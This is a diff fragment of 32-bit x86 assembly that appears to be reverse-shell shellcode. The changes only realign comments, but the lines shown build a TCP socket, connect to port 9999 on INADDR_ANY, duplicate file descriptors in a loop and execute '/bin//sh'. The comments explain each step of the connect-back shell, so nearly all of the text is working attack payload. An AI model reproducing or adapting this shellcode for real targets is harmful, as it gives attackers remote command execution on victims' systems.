@@ -8,7 +8,7 @@ BITS 32
 ; int socketcall(1, [2, 1, 0])
 ; socket(PF_INET, SOCK_STREAM, 0)
 ; s = socket(2, 1, 0)
-push BYTE 0x66 		; socketcall is syscall 102 (0x66)
+push BYTE 0x66 		        ; socketcall is syscall 102 (0x66)
 pop eax
 cdq
 xor ebx, ebx
@@ -29,8 +29,8 @@ pop eax
 inc ebx
 inc ebx				; 3 = SYS_CONNECT = connect()
 push edx			; Build sockaddr: 	INADDR_ANY = 0
-push WORD 0x0f27	; (reverse order)	PORT = 9999
-push WORD 0x2 		; 					AF_INET = 2
+push WORD 0x0f27	        ; (reverse order)	PORT = 9999
+push WORD 0x2 		        ; 			AF_INET = 2
 mov ecx, esp
 push BYTE 16
 push ecx
@@ -54,8 +54,8 @@ jns dup_loop
 ; execve('/bin//sh', ['/bin//sh', NULL], [NULL])
 
 push edx
-push 0x68732f2f		; //sh
-push 0x6e69622f		; /bin
+push 0x68732f2f	               ; //sh
+push 0x6e69622f		       ; /bin
 mov ebx, esp
 push edx
 mov edx, esp
